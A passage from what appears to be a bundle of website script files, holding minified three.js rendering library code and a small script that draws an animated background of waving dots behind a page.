THREE.LineSegments?2:1,g=1,S=x.length;g<S;g++)(k=ye()).positionScreen.copy(x[g]).applyMatrix4(he),0<(g+1)%$||(N=le[Z-2],ve.copy(k.positionScreen),xe.copy(N.positionScreen),!0===Se(ve,xe)&&(ve.multiplyScalar(1/ve.w),xe.multiplyScalar(1/xe.w),(te=we()).id=s.id,te.v1.positionScreen.copy(ve),te.v2.positionScreen.copy(xe),te.z=Math.max(ve.z,xe.z),te.renderOrder=s.renderOrder,te.material=s.material,s.material.vertexColors===THREE.VertexColors&&(te.vertexColors[0].copy(s.geometry.colors[g]),te.vertexColors[1].copy(s.geometry.colors[g-1])),ce.elements.push(te)))}}else if(s instanceof THREE.Sprite){Ee.set(oe.elements[12],oe.elements[13],oe.elements[14],1),Ee.applyMatrix4(fe);var K=1/Ee.w;Ee.z*=K,-1<=Ee.z&&Ee.z<=1&&((ie=He()).id=s.id,ie.x=Ee.x*K,ie.y=Ee.y*K,ie.z=Ee.z,ie.renderOrder=s.renderOrder,ie.object=s,ie.rotation=s.rotation,ie.scale.x=s.scale.x*Math.abs(ie.x-(Ee.x+t.projectionMatrix.elements[0])/(Ee.w+t.projectionMatrix.elements[12])),ie.scale.y=s.scale.y*Math.abs(ie.y-(Ee.y+t.projectionMatrix.elements[5])/(Ee.w+t.projectionMatrix.elements[13])),ie.material=s.material,ce.elements.push(ie))}}return!0===i&&ce.elements.sort(ge),ce}};\n(function() { var o, a, s, l, c, p, E = 100, d = 50, f = 50, i = 0, n = 0, t = window.innerWidth / 2; window.innerHeight; function h() { t = window.innerWidth / 2, window.innerHeight / 2, a.aspect = window.innerWidth / window.innerHeight, a.updateProjectionMatrix(), l.setSize(window.innerWidth, window.innerHeight) } function u(e) { n = e.clientX - t } function r() { a.position.x += .05 * (n - a.position.x), a.position.y = 362.05, a.lookAt({ x: s.position.x, y: window.innerHeight / 3, z: s.position.z }); for (var e = 0, t = 0; t < d; t++)for (var r = 0; r < f; r++)(p = c[e++]).position.y = 50 * Math.sin(.3 * (t + i)) + 50 * Math.sin(.5 * (r + i)), p.scale.x = p.scale.y = 4 * (Math.sin(.3 * (t + i)) + 1) + 4 * (Math.sin(.5 * (r + i)) + 1); l.render(s, a), i += .1 } !function() { (o = document.createElement(\"div\")).style.position = \"fixed\", o.style.top = \"0px\", o.style.left = \"0px\", o.style.zIndex = \"-1\", o.style.opacity = \"0.5\", document.body.appendChild(o), (a = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 1, 1e4)).position.z = 1e3, s = new THREE.Scene, c = new Array; for (var t = 2 * Math.PI, e = new THREE.SpriteCanvasMaterial({ color: 10263708, program: function(e) { e.beginPath(), e.arc(0, 0, .5, 0, t, !0), e.fill() } }), r = 0, i = 0; i < d; i++)for (var n = 0; n < f; n++)(p = c[r++] = new THREE.Sprite(e)).position.x = i * E - d * E / 2, p.position.z = n * E - f * E / 2, s.add(p); (l = new THREE.CanvasRenderer({ alpha: !0 })).setPixelRatio(window.devicePixelRatio), l.setSize(window.innerWidth, window.innerHeight), o.appendChild(l.domElement), document.addEventListener(\"mousemove\", u, !1), window.addEventListener(\"resize\", h, !1) }(), function e() { requestAnimationFrame(e); r() }() })();\n"},{"url":"/lib/three/three.min.js","content":"// threejs.org/license\n(function(l,pa){\"object\"===typeof exports&&\"undefined\"!==typeof module?pa(exports):\"function\"===typeof define&&define.amd?define([\"exports\"],pa):pa(l.THREE=l.THREE||{})})(this,function(l){function pa(){}function D(a,b){this.x=a||0;this.y=b||0}function ea(a,b,c,d,e,f,g,h,m,k){Object.defineProperty(this,\"id\",{value:Ze++});this.uuid=N.generateUUID();this.name=\"\";this.image=void 0!==a?a:ea.DEFAULT_IMAGE;this.mipmaps=[];this.mapping=void 0!==b?b:ea.DEFAULT_MAPPING;this.wrapS=void 0!==c?c:1001;this.wrapT=\nvoid 0!==d?d:1001;this.magFilter=void 0!==e?e:1006;this.minFilter=void 0!==f?f:1008;this.anisotropy=void 0!==m?m:1;this.format=void 0!==g?g:1023;this.type=void 0!==h?h:1009;this.offset=new D(0,0);this.repeat=new D(1,1);this.generateMipmaps=!0;this.premultiplyAlpha=!1;this.flipY=!0;this.unpackAlignment=4;this.encoding=void 0!==k?k:3E3;this.version=0;this.onUpdate=null}function fa(a,b,c,d){this.x=a||0;this.y=b||0;this.z=c||0;this.w=void 0!==d?d:1}function Ya(a,b,c){this.uuid=N.generateUUID();this.width=\na;this.height=b;this.scissor=new fa(0,0,a,b);this.scissorTest=!1;this.viewport=new fa(0,0,a,b);c=c||{};void 0===c.minFilter&&(c.minFilter=1006);this.texture=new ea(void 0,void 0,c.wrapS,c.wrapT,c.magFilter,c.minFilter,c.format,c.type,c.anisotropy,c.encoding);this.depthBuffer=void 0!==c.depthBuffer?c.depthBuffer:!0;this.stencilBuffer=void 0!==c.stencilBuffer?c.stencilBuffer:!0;this.depthTexture=void 0!==c.depthTexture?c.depthTexture:null}function Gb(a,b,c){Ya.call(this,a,b,c);this.activeMipMapLevel=\nthis.activeCubeFace=0}function ca(a,b,c,d){this._x=a||0;this._y=b||0;this._z=c||0;this._w=void 0!==d?d:1}function q(a,b,c){this.x=a||0;this.y=b||0;this.z=c||0}function S(){this.elements=new Float32Array([1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1]);0<arguments.length&&console.error(\"THREE.Matrix4: the constructor no longer reads arguments. use .set() instead.\")}function Za(a,b,c,d,e,f,g,h,m,k){a=void 0!==a?a:[];ea.call(this,a,void 0!==b?b:301,c,d,e,f,g,h,m,k);this.flipY=!1}function Hb(a,b,c){var d=a[0];if(0>=\nd||0<d)return a;var e=b*c,f=Be[e];void 0===f&&(f=new Float32Array(e),Be[e]=f);if(0!==b)for(d.toArray(f,0),d=1,e=0;d!==b;++d)e+=c,a[d].toArray(f,e);return f}function Ce(a,b){var c=De[b];void 0===c&&(c=new Int32Array(b),De[b]=c);for(var d=0;d!==b;++d)c[d]=a.allocTextureUnit();return c}function $e(a,b){a.uniform1f(this.addr,b)}function af(a,b){a.uniform1i(this.addr,b)}function bf(a,b){void 0===b.x?a.uniform2fv(this.addr,b):a.uniform2f(this.addr,b.x,b.y)}function cf(a,b){void 0!==b.x?a.uniform3f(this.addr,\nb.x,b.y,b.z):void 0!==b.r?a.uniform3f(this.addr,b.r,b.g,b.b):a.uniform3fv(this.addr,b)}function df(a,b){void 0===b.x?a.uniform4fv(this.addr,b):a.uniform4f(this.addr,b.x,b.y,b.z,b.w)}function ef(a,b){a.uniformMatrix2fv(this.addr,!1,b.elements||b)}function ff(a,b){a.uniformMatrix3fv(this.addr,!1,b.elements||b)}function gf(a,b){a.uniformMatrix4fv(this.addr,!1,b.elements||b)}function hf(a,b,c){var d=c.allocTextureUnit();a.uniform1i(this.addr,d);c.setTexture2D(b||Ee,d)}function jf(a,b,c){var d=c.allocTextureUnit();\na.uniform1i(this.addr,d);c.setTextureCube(b||Fe,d)}function Ge(a,b){a.uniform2iv(this.addr,b)}function He(a,b){a.uniform3iv(this.addr,b)}function Ie(a,b){a.uniform4iv(this.addr,b)}function kf(a){switch(a){case 5126:return $e;case 35664:return bf;case 35665:return cf;case 35666:return df;case 35674:return ef;case 35675:return ff;case 35676:return gf;case 35678:return hf;case 35680:return jf;case 5124:case 35670:return af;case 35667:case 35671:return Ge;case 35668:case 35672:return He;case 35669:case 35673:return Ie}}\nfunction lf(a,b){a.uniform1fv(this.addr,b)}function mf(a,b){a.uniform1iv(this.addr,b)}function nf(a,b){a.uniform2fv(this.addr,Hb(b,this.size,2))}function of(a,b){a.uniform3fv(this.addr,Hb(b,this.size,3))}function pf(a,b){a.uniform4fv(this.addr,Hb(b,this.size,4))}function qf(a,b){a.uniformMatrix2fv(this.addr,!1,Hb(b,this.size,4))}function rf(a,b){a.uniformMatrix3fv(this.addr,!1,Hb(b,this.size,9))}function sf(a,b){a.uniformMatrix4fv(this.addr,!1,Hb(b,this.size,16))}function tf(a,b,c){var d=b.length,\ne=Ce(c,d);a.uniform1iv(this.addr,e);for(a=0;a!==d;++a)c.setTexture2D(b[a]||Ee,e[a])}function uf(a,b,c){var d=b.length,e=Ce(c,d);a.uniform1iv(this.addr,e);for(a=0;a!==d;++a)c.setTextureCube(b[a]||Fe,e[a])}function vf(a){switch(a){case 5126:return lf;case 35664:return nf;case 35665:return of;case 35666:return pf;case 35674:return qf;case 35675:return rf;case 35676:return sf;case 35678:return tf;case 35680:return uf;case 5124:case 35670:return mf;case 35667:case 35671:return Ge;case 35668:case 35672:return He;\ncase 35669:case 35673:return Ie}}function wf(a,b,c){this.id=a;this.addr=c;this.setValue=kf(b.type)}function xf(a,b,c){this.id=a;this.addr=c;this.size=b.size;this.setValue=vf(b.type)}function Je(a){this.id=a;this.seq=[];this.map={}}function $a(a,b,c){this.seq=[];this.map={};this.renderer=c;c=a.getProgramParameter(b,a.ACTIVE_UNIFORMS);for(var d=0;d<c;++d){var e=a.getActiveUniform(b,d),f=a.getUniformLocation(b,e.name),g=this,h=e.name,m=h.length;for(Rd.lastIndex=0;;){var k=Rd.exec(h),t=Rd.lastIndex,p=\nk[1],n=k[3];\"]\"===k[2]&&(p|=0);if(void 0===n||\"[\"===n&&t+2===m){h=g;e=void 0===n?new wf(p,e,f):new xf(p,e,f);h.seq.push(e);h.map[e.id]=e;break}else n=g.map[p],void 0===n&&(n=new Je(p),p=g,g=n,p.seq.push(g),p.map[g.id]=g),g=n}}}function J(a,b,c){return void 0===b&&void 0===c?this.set(a):this.setRGB(a,b,c)}function eb(a,b,c,d,e,f,g,h,m,k,t,p){ea.call(this,null,f,g,h,m,k,d,e,t,p);this.image={data:a,width:b,height:c};this.magFilter=void 0!==m?m:1003;this.minFilter=void 0!==k?k:1003;this.flipY=this.generateMipmaps=\n!1;this.unpackAlignment=1}function sc(a,b){this.min=void 0!==a?a:new D(Infinity,Infinity);this.max=void 0!==b?b:new D(-Infinity,-Infinity)}function yf(a,b){var c,d,e,f,g,h,m,k,t,p,n=a.context,u=a.state,l,r,A,w,y,K;this.render=function(v,E,L){if(0!==b.length){v=new q;var C=L.w/L.z,F=.5*L.z,da=.5*L.w,H=16/L.w,aa=new D(H*C,H),Da=new q(1,1,0),fb=new D(1,1),Sd=new sc;Sd.min.set(L.x,L.y);Sd.max.set(L.x+(L.z-16),L.y+(L.w-16));if(void 0===w){var H=new Float32Array([-1,-1,0,0,1,-1,1,0,1,1,1,1,-1,1,0,1]),Q=\nnew Uint16Array([0,1,2,0,2,3]);l=n.createBuffer();r=n.createBuffer();n.bindBuffer(n.ARRAY_BUFFER,l);n.bufferData(n.ARRAY_BUFFER,H,n.STATIC_DRAW);n.bindBuffer(n.ELEMENT_ARRAY_BUFFER,r);n.bufferData(n.ELEMENT_ARRAY_BUFFER,Q,n.STATIC_DRAW);y=n.createTexture();K=n.createTexture();u.bindTexture(n.TEXTURE_2D,y);n.texImage2D(n.TEXTURE_2D,0,n.RGB,16,16,0,n.RGB,n.UNSIGNED_BYTE,null);n.texParameteri(n.TEXTURE_2D,n.TEXTURE_WRAP_S,n.CLAMP_TO_EDGE);n.texParameteri(n.TEXTURE_2D,n.TEXTURE_WRAP_T,n.CLAMP_TO_EDGE);\nn.texParameteri(n.TEXTURE_2D,n.TEXTURE_MAG_FILTER,n.NEAREST);n.texParameteri(n.TEXTURE_2D,n.TEXTURE_MIN_FILTER,n.NEAREST);u.bindTexture(n.TEXTURE_2D,K);n.texImage2D(n.TEXTURE_2D,0,n.RGBA,16,16,0,n.RGBA,n.UNSIGNED_BYTE,null);n.texParameteri(n.TEXTURE_2D,n.TEXTURE_WRAP_S,n.CLAMP_TO_EDGE);n.texParameteri(n.TEXTURE_2D,n.TEXTURE_WRAP_T,n.CLAMP_TO_EDGE);n.texParameteri(n.TEXTURE_2D,n.TEXTURE_MAG_FILTER,n.NEAREST);n.texParameteri(n.TEXTURE_2D,n.TEXTURE_MIN_FILTER,n.NEAREST);var H=A={vertexShader:\"uniform lowp int renderType;\\nuniform vec3 screenPosition;\\nuniform vec2 scale;\\nuniform float rotation;\\nuniform sampler2D occlusionMap;\\nattribute vec2 position;\\nattribute vec2 uv;\\nvarying vec2 vUV;\\nvarying float vVisibility;\\nvoid main() {\\nvUV = uv;\\nvec2 pos = position;\\nif ( renderType == 2 ) {\\nvec4 visibility = texture2D( occlusionMap, vec2( 0.1, 0.1 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.5, 0.1 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.9, 0.1 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.9, 0.5 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.9, 0.9 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.5, 0.9 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.1, 0.9 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.1, 0.5 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.5, 0.5 ) );\\nvVisibility =        visibility.r / 9.0;\\nvVisibility *= 1.0 - visibility.g / 9.0;\\nvVisibility *=       visibility.b / 9.0;\\nvVisibility *= 1.0 - visibility.a / 9.0;\\npos.x = cos( rotation ) * position.x - sin( rotation ) * position.y;\\npos.y = sin( rotation ) * position.x + cos( rotation ) * position.y;\\n}\\ngl_Position = vec4( ( pos * scale + screenPosition.xy ).xy, screenPosition.z, 1.0 );\\n}\",\nfragmentShader:\"uniform lowp int renderType;\\nuniform sampler2D map;\\nuniform float opacity;\\nuniform vec3 color;\\nvarying vec2 vUV;\\nvarying float vVisibility;\\nvoid main() {\\nif ( renderType == 0 ) {\\ngl_FragColor = vec4( 1.0, 0.0, 1.0, 0.0 );\\n} else if ( renderType == 1 ) {\\ngl_FragColor = texture2D( map, vUV );\\n} else {\\nvec4 texture = texture2D( map, vUV );\\ntexture.a *= opacity * vVisibility;\\ngl_FragColor = texture;\\ngl_FragColor.rgb *= color;\\n}\\n}\"},Q=n.createProgram(),M=n.createShader(n.FRAGMENT_SHADER),\nO=n.createShader(n.VERTEX_SHADER),P=\"precision \"+a.getPrecision()+\" float;\\n\";n.shaderSource(M,P+H.fragmentShader);n.shaderSource(O,P+H.vertexShader);n.compileShader(M);n.compileShader(O);n.attachShader(Q,M);n.attachShader(Q,O);n.linkProgram(Q);w=Q;t=n.getAttribLocation(w,\"position\");p=n.getAttribLocation(w,\"uv\");c=n.getUniformLocation(w,\"renderType\");d=n.getUniformLocation(w,\"map\");e=n.getUniformLocation(w,\"occlusionMap\");f=n.getUniformLocation(w,\"opacity\");g=n.getUniformLocation(w,\"color\");h=n.getUniformLocation(w,\n\"scale\");m=n.getUniformLocation(w,\"rotation\");k=n.getUniformLocation(w,\"screenPosition\")}n.useProgram(w);u.initAttributes();u.enableAttribute(t);u.enableAttribute(p);u.disableUnusedAttributes();n.uniform1i(e,0);n.uniform1i(d,1);n.bindBuffer(n.ARRAY_BUFFER,l);n.vertexAttribPointer(t,2,n.FLOAT,!1,16,0);n.vertexAttribPointer(p,2,n.FLOAT,!1,16,8);n.bindBuffer(n.ELEMENT_ARRAY_BUFFER,r);u.disable(n.CULL_FACE);u.setDepthWrite(!1);Q=0;for(M=b.length;Q<M;Q++)if(H=16/L.w,aa.set(H*C,H),O=b[Q],v.set(O.matrixWorld.elements[12],\nO.matrixWorld.elements[13],O.matrixWorld.elements[14]),v.applyMatrix4(E.matrixWorldInverse),v.applyMatrix4(E.projectionMatrix),Da.copy(v),fb.x=L.x+Da.x*F+F-8,fb.y=L.y+Da.y*da+da-8,!0===Sd.containsPoint(fb)){u.activeTexture(n.TEXTURE0);u.bindTexture(n.TEXTURE_2D,null);u.activeTexture(n.TEXTURE1);u.bindTexture(n.TEXTURE_2D,y);n.copyTexImage2D(n.TEXTURE_2D,0,n.RGB,fb.x,fb.y,16,16,0);n.uniform1i(c,0);n.uniform2f(h,aa.x,aa.y);n.uniform3f(k,Da.x,Da.y,Da.z);u.disable(n.BLEND);u.enable(n.DEPTH_TEST);n.drawElements(n.TRIANGLES,\n6,n.UNSIGNED_SHORT,0);u.activeTexture(n.TEXTURE0);u.bindTexture(n.TEXTURE_2D,K);n.copyTexImage2D(n.TEXTURE_2D,0,n.RGBA,fb.x,fb.y,16,16,0);n.uniform1i(c,1);u.disable(n.DEPTH_TEST);u.activeTexture(n.TEXTURE1);u.bindTexture(n.TEXTURE_2D,y);n.drawElements(n.TRIANGLES,6,n.UNSIGNED_SHORT,0);O.positionScreen.copy(Da);O.customUpdateCallback?O.customUpdateCallback(O):O.updateLensFlares();n.uniform1i(c,2);u.enable(n.BLEND);for(var P=0,wa=O.lensFlares.length;P<wa;P++){var W=O.lensFlares[P];.001<W.opacity&&.001<\nW.scale&&(Da.x=W.x,Da.y=W.y,Da.z=W.z,H=W.size*W.scale/L.w,aa.x=H*C,aa.y=H,n.uniform3f(k,Da.x,Da.y,Da.z),n.uniform2f(h,aa.x,aa.y),n.uniform1f(m,W.rotation),n.uniform1f(f,W.opacity),n.uniform3f(g,W.color.r,W.color.g,W.color.b),u.setBlending(W.blending,W.blendEquation,W.blendSrc,W.blendDst),a.setTexture2D(W.texture,1),n.drawElements(n.TRIANGLES,6,n.UNSIGNED_SHORT,0))}}u.enable(n.CULL_FACE);u.enable(n.DEPTH_TEST);u.setDepthWrite(!0);a.resetGLState()}}}function zf(a,b){var c,d,e,f,g,h,m,k,t,p,n,u,l,r,\nA,w,y;function K(a,b){return a.renderOrder!==b.renderOrder?a.renderOrder-b.renderOrder:a.z!==b.z?b.z-a.z:b.id-a.id}var v=a.context,E=a.state,L,C,F,da,H=new q,aa=new ca,Da=new q;this.render=function(q,D){if(0!==b.length){if(void 0===F){var Q=new Float32Array([-.5,-.5,0,0,.5,-.5,1,0,.5,.5,1,1,-.5,.5,0,1]),M=new Uint16Array([0,1,2,0,2,3]);L=v.createBuffer();C=v.createBuffer();v.bindBuffer(v.ARRAY_BUFFER,L);v.bufferData(v.ARRAY_BUFFER,Q,v.STATIC_DRAW);v.bindBuffer(v.ELEMENT_ARRAY_BUFFER,C);v.bufferData(v.ELEMENT_ARRAY_BUFFER,\nM,v.STATIC_DRAW);var Q=v.createProgram(),M=v.createShader(v.VERTEX_SHADER),O=v.createShader(v.FRAGMENT_SHADER);v.shaderSource(M,[\"precision \"+a.getPrecision()+\" float;\",\"uniform mat4 modelViewMatrix;\\nuniform mat4 projectionMatrix;\\nuniform float rotation;\\nuniform vec2 scale;\\nuniform vec2 uvOffset;\\nuniform vec2 uvScale;\\nattribute vec2 position;\\nattribute vec2 uv;\\nvarying vec2 vUV;\\nvoid main() {\\nvUV = uvOffset + uv * uvScale;\\nvec2 alignedPosition = position * scale;\\nvec2 rotatedPosition;\\nrotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;\\nrotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;\\nvec4 finalPosition;\\nfinalPosition = modelViewMatrix * vec4( 0.0, 0.0, 0.0, 1.0 );\\nfinalPosition.xy += rotatedPosition;\\nfinalPosition = projectionMatrix * finalPosition;\\ngl_Position = finalPosition;\\n}\"].join(\"\\n\"));\nv.shaderSource(O,[\"precision \"+a.getPrecision()+\" float;\",\"uniform vec3 color;\\nuniform sampler2D map;\\nuniform float opacity;\\nuniform int fogType;\\nuniform vec3 fogColor;\\nuniform float fogDensity;\\nuniform float fogNear;\\nuniform float fogFar;\\nuniform float alphaTest;\\nvarying vec2 vUV;\\nvoid main() {\\nvec4 texture = texture2D( map, vUV );\\nif ( texture.a < alphaTest ) discard;\\ngl_FragColor = vec4( color * texture.xyz, texture.a * opacity );\\nif ( fogType > 0 ) {\\nfloat depth = gl_FragCoord.z / gl_FragCoord.w;\\nfloat fogFactor = 0.0;\\nif ( fogType == 1 ) {\\nfogFactor = smoothstep( fogNear, fogFar, depth );\\n} else {\\nconst float LOG2 = 1.442695;\\nfogFactor = exp2( - fogDensity * fogDensity * depth * depth * LOG2 );\\nfogFactor = 1.0 - clamp( fogFactor, 0.0, 1.0 );\\n}\\ngl_FragColor = mix( gl_FragColor, vec4( fogColor, gl_FragColor.w ), fogFactor );\\n}\\n}\"].join(\"\\n\"));\nv.compileShader(M);v.compileShader(O);v.attachShader(Q,M);v.attachShader(Q,O);v.linkProgram(Q);F=Q;w=v.getAttribLocation(F,\"position\");y=v.getAttribLocation(F,\"uv\");c=v.getUniformLocation(F,\"uvOffset\");d=v.getUniformLocation(F,\"uvScale\");e=v.getUniformLocation(F,\"rotation\");f=v.getUniformLocation(F,\"scale\");g=v.getUniformLocation(F,\"color\");h=v.getUniformLocation(F,\"map\");m=v.getUniformLocation(F,\"opacity\");k=v.getUniformLocation(F,\"modelViewMatrix\");t=v.getUniformLocation(F,\"projectionMatrix\");p=\nv.getUniformLocation(F,\"fogType\");n=v.getUniformLocation(F,\"fogDensity\");u=v.getUniformLocation(F,\"fogNear\");l=v.getUniformLocation(F,\"fogFar\");r=v.getUniformLocation(F,\"fogColor\");A=v.getUniformLocation(F,\"alphaTest\");Q=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");Q.width=8;Q.height=8;M=Q.getContext(\"2d\");M.fillStyle=\"white\";M.fillRect(0,0,8,8);da=new ea(Q);da.needsUpdate=!0}v.useProgram(F);E.initAttributes();E.enableAttribute(w);E.enableAttribute(y);E.disableUnusedAttributes();\nE.disable(v.CULL_FACE);E.enable(v.BLEND);v.bindBuffer(v.ARRAY_BUFFER,L);v.vertexAttribPointer(w,2,v.FLOAT,!1,16,0);v.vertexAttribPointer(y,2,v.FLOAT,!1,16,8);v.bindBuffer(v.ELEMENT_ARRAY_BUFFER,C);v.uniformMatrix4fv(t,!1,D.projectionMatrix.elements);E.activeTexture(v.TEXTURE0);v.uniform1i(h,0);M=Q=0;(O=q.fog)?(v.uniform3f(r,O.color.r,O.color.g,O.color.b),O.isFog?(v.uniform1f(u,O.near),v.uniform1f(l,O.far),v.uniform1i(p,1),M=Q=1):O.isFogExp2&&(v.uniform1f(n,O.density),v.uniform1i(p,2),M=Q=2)):(v.uniform1i(p,\n0),M=Q=0);for(var O=0,P=b.length;O<P;O++){var wa=b[O];wa.modelViewMatrix.multiplyMatrices(D.matrixWorldInverse,wa.matrixWorld);wa.z=-wa.modelViewMatrix.elements[14]}b.sort(K);for(var W=[],O=0,P=b.length;O<P;O++){var wa=b[O],x=wa.material;!1!==x.visible&&(v.uniform1f(A,x.alphaTest),v.uniformMatrix4fv(k,!1,wa.modelViewMatrix.elements),wa.matrixWorld.decompose(H,aa,Da),W[0]=Da.x,W[1]=Da.y,wa=0,q.fog&&x.fog&&(wa=M),Q!==wa&&(v.uniform1i(p,wa),Q=wa),null!==x.map?(v.uniform2f(c,x.map.offset.x,x.map.offset.y),\nv.uniform2f(d,x.map.repeat.x,x.map.repeat.y)):(v.uniform2f(c,0,0),v.uniform2f(d,1,1)),v.uniform1f(m,x.opacity),v.uniform3f(g,x.color.r,x.color.g,x.color.b),v.uniform1f(e,x.rotation),v.uniform2fv(f,W),E.setBlending(x.blending,x.blendEquation,x.blendSrc,x.blendDst),E.setDepthTest(x.depthTest),E.setDepthWrite(x.depthWrite),x.map?a.setTexture2D(x.map,0):a.setTexture2D(da,0),v.drawElements(v.TRIANGLES,6,v.UNSIGNED_SHORT,0))}E.enable(v.CULL_FACE);a.resetGLState()}}}function X(){Object.defineProperty(this,\n\"id\",{value:Af++});this.uuid=N.generateUUID();this.name=\"\";this.type=\"Material\";this.lights=this.fog=!0;this.blending=1;this.side=0;this.shading=2;this.vertexColors=0;this.opacity=1;this.transparent=!1;this.blendSrc=204;this.blendDst=205;this.blendEquation=100;this.blendEquationAlpha=this.blendDstAlpha=this.blendSrcAlpha=null;this.depthFunc=3;this.depthWrite=this.depthTest=!0;this.clippingPlanes=null;this.clipShadows=this.clipIntersection=!1;this.colorWrite=!0;this.precision=null;this.polygonOffset=\n!1;this.alphaTest=this.polygonOffsetUnits=this.polygonOffsetFactor=0;this.premultipliedAlpha=!1;this.overdraw=0;this._needsUpdate=this.visible=!0}function Ha(a){X.call(this);this.type=\"ShaderMaterial\";this.defines={};this.uniforms={};this.vertexShader=\"void main() {\\n\\tgl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );\\n}\";this.fragmentShader=\"void main() {\\n\\tgl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );\\n}\";this.linewidth=1;this.wireframe=!1;this.wireframeLinewidth=1;this.morphNormals=\nthis.morphTargets=this.skinning=this.clipping=this.lights=this.fog=!1;this.extensions={derivatives:!1,fragDepth:!1,drawBuffers:!1,shaderTextureLOD:!1};this.defaultAttributeValues={color:[1,1,1],uv:[0,0],uv2:[0,0]};this.index0AttributeName=void 0;void 0!==a&&(void 0!==a.attributes&&console.error(\"THREE.ShaderMaterial: attributes should now be defined in THREE.BufferGeometry instead.\"),this.setValues(a))}function ab(a){X.call(this);this.type=\"MeshDepthMaterial\";this.depthPacking=3200;this.morphTargets=\nthis.skinning=!1;this.displacementMap=this.alphaMap=this.map=null;this.displacementScale=1;this.displacementBias=0;this.wireframe=!1;this.wireframeLinewidth=1;this.lights=this.fog=!1;this.setValues(a)}function Pa(a,b){this.min=void 0!==a?a:new q(Infinity,Infinity,Infinity);this.max=void 0!==b?b:new q(-Infinity,-Infinity,-Infinity)}function Na(a,b){this.center=void 0!==a?a:new q;this.radius=void 0!==b?b:0}function ya(){this.elements=new Float32Array([1,0,0,0,1,0,0,0,1]);0<arguments.length&&console.error(\"THREE.Matrix3: the constructor no longer reads arguments. use .set() instead.\")}\nfunction la(a,b){this.normal=void 0!==a?a:new q(1,0,0);this.constant=void 0!==b?b:0}function tc(a,b,c,d,e,f){this.planes=[void 0!==a?a:new la,void 0!==b?b:new la,void 0!==c?c:new la,void 0!==d?d:new la,void 0!==e?e:new la,void 0!==f?f:new la]}function Ke(a,b,c,d){function e(b,c,d,e){var f=b.geometry,g;g=A;var h=b.customDepthMaterial;d&&(g=w,h=b.customDistanceMaterial);h?g=h:(h=!1,c.morphTargets&&(f&&f.isBufferGeometry?h=f.morphAttributes&&f.morphAttributes.position&&0<f.morphAttributes.position.length:\nf&&f.isGeometry&&(h=f.morphTargets&&0<f.morphTargets.length)),b=b.isSkinnedMesh&&c.skinning,f=0,h&&(f|=1),b&&(f|=2),g=g[f]);a.localClippingEnabled&&!0===c.clipShadows&&0!==c.clippingPlanes.length&&(f=g.uuid,h=c.uuid,b=y[f],void 0===b&&(b={},y[f]=b),f=b[h],void 0===f&&(f=g.clone(),b[h]=f),g=f);g.visible=c.visible;g.wireframe=c.wireframe;h=c.side;aa.renderSingleSided&&2==h&&(h=0);aa.renderReverseSided&&(0===h?h=1:1===h&&(h=0));g.side=h;g.clipShadows=c.clipShadows;g.clippingPlanes=c.clippingPlanes;g.wireframeLinewidth=\nc.wireframeLinewidth;g.linewidth=c.linewidth;d&&void 0!==g.uniforms.lightPos&&g.uniforms.lightPos.value.copy(e);return g}function f(a,b,c){if(!1!==a.visible){0!==(a.layers.mask&b.layers.mask)&&(a.isMesh||a.isLine||a.isPoints)&&a.castShadow&&(!1===a.frustumCulled||!0===m.intersectsObject(a))&&!0===a.material.visible&&(a.modelViewMatrix.multiplyMatrices(c.matrixWorldInverse,a.matrixWorld),r.push(a));a=a.children;for(var d=0,e=a.length;d<e;d++)f(a[d],b,c)}}var g=a.context,h=a.state,m=new tc,k=new S,\nt=b.shadows,p=new D,n=new D(d.maxTextureSize,d.maxTextureSize),u=new q,l=new q,r=[],A=Array(4),w=Array(4),y={},K=[new q(1,0,0),new q(-1,0,0),new q(0,0,1),new q(0,0,-1),new q(0,1,0),new q(0,-1,0)],v=[new q(0,1,0),new q(0,1,0),new q(0,1,0),new q(0,1,0),new q(0,0,1),new q(0,0,-1)],E=[new fa,new fa,new fa,new fa,new fa,new fa];b=new ab;b.depthPacking=3201;b.clipping=!0;d=bb.distanceRGBA;for(var L=Ja.clone(d.uniforms),C=0;4!==C;++C){var F=0!==(C&1),da=0!==(C&2),H=b.clone();H.morphTargets=F;H.skinning=\nda;A[C]=H;F=new Ha({defines:{USE_SHADOWMAP:\"\"},uniforms:L,vertexShader:d.vertexShader,fragmentShader:d.fragmentShader,morphTargets:F,skinning:da,clipping:!0});w[C]=F}var aa=this;this.enabled=!1;this.autoUpdate=!0;this.needsUpdate=!1;this.type=1;this.renderSingleSided=this.renderReverseSided=!0;this.render=function(b,d){if(!1!==aa.enabled&&(!1!==aa.autoUpdate||!1!==aa.needsUpdate)&&0!==t.length){h.buffers.color.setClear(1,1,1,1);h.disable(g.BLEND);h.setDepthTest(!0);h.setScissorTest(!1);for(var y,\nq,A=0,C=t.length;A<C;A++){var w=t[A],L=w.shadow;if(void 0===L)console.warn(\"THREE.WebGLShadowMap:\",w,\"has no shadow.\");else{var F=L.camera;p.copy(L.mapSize);p.min(n);if(w&&w.isPointLight){y=6;q=!0;var H=p.x,da=p.y;E[0].set(2*H,da,H,da);E[1].set(0,da,H,da);E[2].set(3*H,da,H,da);E[3].set(H,da,H,da);E[4].set(3*H,0,H,da);E[5].set(H,0,H,da);p.x*=4;p.y*=2}else y=1,q=!1;null===L.map&&(L.map=new 